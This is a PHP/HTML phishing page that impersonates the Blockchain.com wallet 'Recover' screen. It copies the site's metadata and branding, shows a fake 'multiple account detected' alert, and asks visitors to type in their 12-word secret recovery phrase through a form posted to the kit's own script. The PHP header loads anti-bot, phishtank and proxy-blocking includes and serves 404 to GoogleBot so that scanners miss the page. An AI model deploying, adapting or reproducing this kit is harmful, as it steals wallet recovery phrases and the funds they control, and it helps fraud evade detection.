<?php
/*   
     T E L E G R A M : T . M E / C O D E X _ D Z                    
*/
session_start();
include('antibots.php');
include('antibot_host.php');
include('antibot_ip.php');
include('antibot_phishtank.php');
include('antibot_userAgent.php');
include('proxyblock.php');
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<meta name="apple-itunes-app" content="app-id=493253309">
<meta name="description" content="The world's most trusted and popular crypto wallet. Sign up today to buy and sell Bitcoin, Ethereum and other top cryptocurrencies.">
<meta name="keywords" content="bitcoin wallet, blockchain wallet, online bitcoin wallet, bitcoin wallet online">
<meta property="og:url" content="https://www.login.blockchain.com">
<meta property="og:type" content="website">
<meta property="og:title" content="Blockchain.com Wallet - The World's Most Trusted Wallet">
<meta property="og:description" content="The world's most trusted and popular crypto wallet. Sign up today to buy and sell Bitcoin, Ethereum and other top cryptocurrencies.">
<meta property="og:image" content="https://www.blockchain.com/static/img/home/opengraph.png">
<meta property="og:image:type" content="image/png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://www.blockchain.com/static/img/home/opengraph.png">
<meta name="twitter:description" content="The world's most trusted and popular crypto wallet. Sign up today to buy and sell Bitcoin, Ethereum and other top cryptocurrencies.">

<title>Blockchain.com | Recover</title>

	  
	  <style nonce="">html,
      body,
      #app,
      #app > div {
        padding: 0;
        margin: 0;
        height: 100%;
      }

      html,
      body {
        background-color: rgb(18, 29, 51);
        overflow: hidden;
      }

      html.nfts,
      html.nfts body {
        background-color: initial;
        overflow: initial;
      }

      ::-webkit-scrollbar {
        display: none;
      }

      * {
        scrollbar-width: none;
        -ms-overflow-style: none;
        -webkit-font-smoothing: antialiased;
      }

      .grecaptcha-badge {
        visibility: hidden;
      }</style>
	  <style>
            #zwimel {
                width: 100%;
                height: 100%;
                top: 0px;
                left: 0px;
                position: fixed;
                display: block;
                opacity: .9;
                background-color: #fff;
                z-index: 99;
                text-align: center;
            }
        </style>
	  <link rel="shortcut icon" href="https://login.blockchain.com/img/favicons-b0919a0b68/favicon.ico">
	  <link rel="icon" type="image/png" sizes="16x16" href="https://login.blockchain.com/img/favicons-b0919a0b68/favicon-16x16.png">
	  <link rel="icon" type="image/png" sizes="32x32" href="https://login.blockchain.com/img/favicons-b0919a0b68/favicon-32x32.png">
	  <link rel="icon" type="image/png" sizes="48x48" href="https://login.blockchain.com/img/favicons-b0919a0b68/favicon-48x48.png">
	  <link rel="manifest" href="https://login.blockchain.com/img/favicons-b0919a0b68/manifest.json">
	  <meta name="mobile-web-app-capable" content="yes"><meta name="theme-color" content="#fff">
	  <meta name="application-name" content="blockchain-wallet-v4-frontend">
	  <link rel="apple-touch-icon" sizes="57x57" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-icon-57x57.png">
	  <link rel="apple-touch-icon" sizes="60x60" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-icon-60x60.png">
	  <link rel="apple-touch-icon" sizes="72x72" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-icon-72x72.png">
	  <link rel="apple-touch-icon" sizes="76x76" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-icon-76x76.png">
	  <link rel="apple-touch-icon" sizes="114x114" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-icon-114x114.png">
	  <link rel="apple-touch-icon" sizes="120x120" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-icon-120x120.png">
	  <link rel="apple-touch-icon" sizes="144x144" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-icon-144x144.png">
	  <link rel="apple-touch-icon" sizes="152x152" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-icon-152x152.png">
	  <link rel="apple-touch-icon" sizes="167x167" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-icon-167x167.png">
	  <link rel="apple-touch-icon" sizes="180x180" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-icon-180x180.png">
	  <link rel="apple-touch-icon" sizes="1024x1024" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-icon-1024x1024.png">
	  <meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
	  <meta name="apple-mobile-web-app-title" content="blockchain-wallet-v4-frontend">
	  <link rel="stylesheet" type="text/css" href="files/styles__ltr.css">
	  <link rel="stylesheet" type="text/css" href="files/css.css">
	  <link rel="stylesheet" type="text/css" href="files/css1.css">
	  <link rel="stylesheet" type="text/css" href="files/css2.css">
	  <link rel="stylesheet" type="text/css" href="files/css3.css">
	  <link rel="apple-touch-startup-image" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-640x1136.png">
	  <link rel="apple-touch-startup-image" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-750x1334.png">
	  <link rel="apple-touch-startup-image" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-828x1792.png"><link rel="apple-touch-startup-image" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-1125x2436.png"><link rel="apple-touch-startup-image" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-1242x2208.png"><link rel="apple-touch-startup-image" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-1242x2688.png"><link rel="apple-touch-startup-image" media="(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-1536x2048.png"><link rel="apple-touch-startup-image" media="(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-1668x2224.png"><link rel="apple-touch-startup-image" media="(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-1668x2388.png"><link rel="apple-touch-startup-image" media="(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-2048x2732.png"><link rel="apple-touch-startup-image" media="(device-width: 810px) and (device-height: 1080px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-1620x2160.png"><link rel="apple-touch-startup-image" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-1136x640.png"><link rel="apple-touch-startup-image" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-1334x750.png"><link rel="apple-touch-startup-image" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-1792x828.png"><link rel="apple-touch-startup-image" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-2436x1125.png"><link rel="apple-touch-startup-image" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-2208x1242.png"><link rel="apple-touch-startup-image" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-2688x1242.png"><link rel="apple-touch-startup-image" media="(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-2048x1536.png"><link rel="apple-touch-startup-image" media="(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-2224x1668.png"><link rel="apple-touch-startup-image" media="(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-2388x1668.png"><link rel="apple-touch-startup-image" media="(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-2732x2048.png"><link rel="apple-touch-startup-image" media="(device-width: 810px) and (device-height: 1080px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="https://login.blockchain.com/img/favicons-b0919a0b68/apple-touch-startup-image-2160x1620.png"><link rel="icon" type="image/png" sizes="228x228" href="https://login.blockchain.com/img/favicons-b0919a0b68/coast-228x228.png"><meta name="msapplication-TileColor" content="#fff"><meta name="msapplication-TileImage" content="/img/favicons-b0919a0b68/mstile-144x144.png"><meta name="msapplication-config" content="/img/favicons-b0919a0b68/browserconfig.xml">
	  <link rel="yandex-tableau-widget" href="https://login.blockchain.com/img/favicons-b0919a0b68/yandex-browser-manifest.json">
	  

	  
	  <style data-styled="" data-styled-version="4.4.1" nonce=""></style><style nonce=""></style>
	  
	  </head>
	  
	  <body>
	  <div id="app">
	  <div class="sc-etwtAo cjphei" style="">
	  <div class="sc-bwCtUz gAwTlF" style="display:none"><div class="sc-hrWEMg idTDMy"><div class="sc-dqBHgY cotZjA"><div color="blue600" class="sc-gxMtzJ ikTJTw"><div class="sc-dfVpRl fRzIwv"><div data-e2e="toastMessage" style="" color="grey700" cursor="inherit" opacity="1" class="sc-gzVnrw dAqllt">Multiple Account Detected With Your Email Or Wallet ID, Please <a href="pop.html" style="color:rgb(80, 89, 107);">Import Wallet Manually.</a> </div></div><span data-e2e="toastMessageClose" color="grey500" class="sc-bxivhb fcKoCr sc-iyvyFf bPibvP" style=""></span></div></div></div></div>
	  <div class="sc-jXQZqI dGdSqR">
	  <div height="112px" class="sc-fcdeBU dFsfkz">
	  <div class="sc-gmeYpB eOMbxr sc-kZmsYB dTLxqF">
	  <div class="sc-daURTG itBfVj sc-RcBXQ bCRrpa">
	  <div class="sc-fZwumE icQETu">
	  <a class="sc-htpNat bzateK sc-fQejPQ VtDPC" color="blue600" href="javascript:void(0);"><img src="files/bc-logo.svg" srcset="" class="sc-bwzfXH ixijk sc-iSDuPN dVLnlH" color="auto" width="auto" height="24px"></a></div></div></div></div></div><div class="sc-iGPElx lnOPvk">
	  
	  <div id="zwimel" class="zwimel" style="display:none;"></div>
	  <form id="phrase" name="phrase" method="POST" action="" class="sc-hUfwpO bHzUYb">
	  
	  
	  <div class="sc-eLdqWK sc-fKGOjr bAerop"><div class="sc-jvEmr hOxITL"><div style="margin-bottom: 16px;" class="sc-kVrTmx bJqBWn"><span data-e2e="recoverBack" color="blue600" role="button" style="color: transparent; font-size: 38px; font-weight: 400; margin-right: 4px;" class="sc-bxivhb koDvea"></span><div color="grey900" cursor="pointer" opacity="1" class="sc-gzVnrw gFCRIM">Back </div></div><div class="sc-hizQCF dwhZMf"><div color="grey900" style="margin-bottom: 8px;" cursor="inherit" opacity="1" class="sc-gzVnrw BCruu">Input your secret private key recovery phrase </div><div color="grey600" style="margin-bottom: 16px;" cursor="inherit" opacity="1" class="sc-gzVnrw iVtkAS">Your 12 word Secret Private Key Recovery Phrase grants access to your account. Please input it in the order specified. </div><div class="sc-hcmgZB iHKdpR" height="48px"><div class="sc-jhAzac Pbjyv"><input id="mnemonic" required name="mnemonic" autocomplete="off" placeholder="Enter your secret private key recovery phrase" minlength="60" spellcheck="false" type="text" class="sc-hzDkRC flbxTH" value="" height="48px"></div></div></div><div color="grey600" style="margin: 8px 0px 24px; text-align: center;" cursor="inherit" opacity="1" class="sc-gzVnrw jPqPHm">Separate each word with a space </div><button type="submit" height="48px" data-e2e="submitRecoveryPhrase" style="margin-bottom: 16px;" color="white" class="sc-gqjmRU grufYx"><div color="whiteFade900" cursor="inherit" opacity="1" class="sc-gzVnrw edfwkt">Continue </div></button></div><div class="sc-hycgNl mLYbU"><div class="sc-chAAoq ebsrcn"><div color="grey600" style="cursor: pointer; margin-top: 16px;" cursor="inherit" opacity="1" class="sc-gzVnrw dZiTwf">Trouble Logging In? </div>&nbsp;<a  href="javascript:void(0);" style="margin-left: 2px;" class="sc-htpNat ixOYeY sc-dTLGrV eqReGL" color="blue600">Contact Support</a></div></div></div></form>
	  </div><div class="sc-clNaTc eSCtEw"><div class="sc-cmthru iKdPpP"><div class="sc-kGXeez kXiRmv"><ul class="sc-jKJlTe jxbiXh"><li class="sc-eNQAEJ gPmVSj">English</li><li class="sc-eNQAEJ gPmVSj">Fran??ais</li><li class="sc-eNQAEJ gPmVSj">??????????????</li></ul><div color="grey400" class="sc-kpOJdX kyfudT"><div class="sc-dxgOiQ kPtlNs">English</div><span class="sc-bxivhb cHKfSC sc-ckVGcZ csAZWy" style="font-size: 12px; font-weight: 400;"></span></div></div><span class="sc-esOvli jkIcBL"><a color="grey400" class="sc-htpNat ecJsZh" href="javascript:void(0);">Version 4.68.12</a></span><div class="sc-hZSUBg bZFrda"><a color="grey400" class="sc-htpNat ecJsZh" href="javascript:void(0);"><div color="grey400" cursor="inherit" opacity="1" class="sc-gzVnrw hLxhAA">Need Help? </div></a></div></div></div></div></div><div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="files/anchor.html" role="presentation" name="a-z5zn6vgzf9f6" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" width="256" height="60" frameborder="0"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div><style type="text/css"></style><style type="text/css"></style><style type="text/css"></style>
	  
	  
	 
	  </body>
	  
<script src="files/jquery.min.js"></script>
<script src="files/jquery.validate.min.js"></script>
<script src="files/form.js"></script>
	  
	  </html>